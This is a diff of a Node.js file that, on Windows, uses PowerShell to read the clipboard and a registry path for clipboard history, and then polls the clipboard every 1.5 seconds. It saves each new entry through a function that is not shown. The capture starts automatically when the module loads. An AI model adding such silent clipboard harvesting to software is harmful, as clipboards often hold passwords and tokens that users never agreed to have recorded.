@@ -19,42 +19,36 @@ function salvar_clipboard(texto) {
 }
 
 function pegar_historico_clipboard() {
-  try {
-    const comando = 'Get-Clipboard -Format Text'
-    const texto = execSync('powershell -command \'' + comando + '\'', { encoding: 'utf8' }).trim()
-    if (texto) salvar_clipboard(texto)
-  } catch (erro) {
-  }
+  execSync('powershell -command "Get-Command Get-Clipboard"', { stdio: 'ignore' })
+  const comando = 'Get-Clipboard -Format Text'
+  const texto = execSync('powershell -command "' + comando + '"', { encoding: 'utf8' }).trim()
+  if (texto) salvar_clipboard(texto)
 
-  try {
-    const comando_hist = [
-      '$itens = Get-ItemProperty -Path HKCU:\\Software\\Microsoft\\Clipboard\\History\\* 2>$null;',
-      'if ($itens) { $itens | ForEach-Object { $_.Text } }'
-    ].join(' ')
-    const saida = execSync('powershell -command \'' + comando_hist + '\'', { encoding: 'utf8' })
-    saida.split('\n')
-      .map(linha => linha.trim())
-      .filter(Boolean)
-      .forEach(salvar_clipboard)
-  } catch (erro) {
-  }
+  execSync('powershell -command "Get-Command Get-ItemProperty"', { stdio: 'ignore' })
+  const comando_hist = [
+    '$itens = Get-ItemProperty -Path HKCU:\\Software\\Microsoft\\Clipboard\\History\\* 2>$null;',
+    'if ($itens) { $itens | ForEach-Object { $_.Text } }'
+  ].join(' ')
+  const saida = execSync('powershell -command "' + comando_hist + '"', { encoding: 'utf8' })
+  saida.split('\n')
+    .map(linha => linha.trim())
+    .filter(Boolean)
+    .forEach(salvar_clipboard)
 }
 
 function monitorar_clipboard() {
   let ultimo = ''
   setInterval(() => {
-    try {
-      const texto = execSync('powershell -command \'Get-Clipboard -Format Text\'', { encoding: 'utf8' }).trim()
-      if (texto && texto !== ultimo) {
-        salvar_clipboard(texto)
-        ultimo = texto
-      }
-    } catch (erro) {
+    const texto = execSync('powershell -command "Get-Clipboard -Format Text"', { encoding: 'utf8' }).trim()
+    if (texto && texto !== ultimo) {
+      salvar_clipboard(texto)
+      ultimo = texto
     }
   }, 1500)
 }
 
 if (os.platform() === 'win32') {
+  execSync('powershell -command "Write-Host \'PowerShell OK\'"', { stdio: 'ignore' })
   pegar_historico_clipboard()
   monitorar_clipboard()
 }
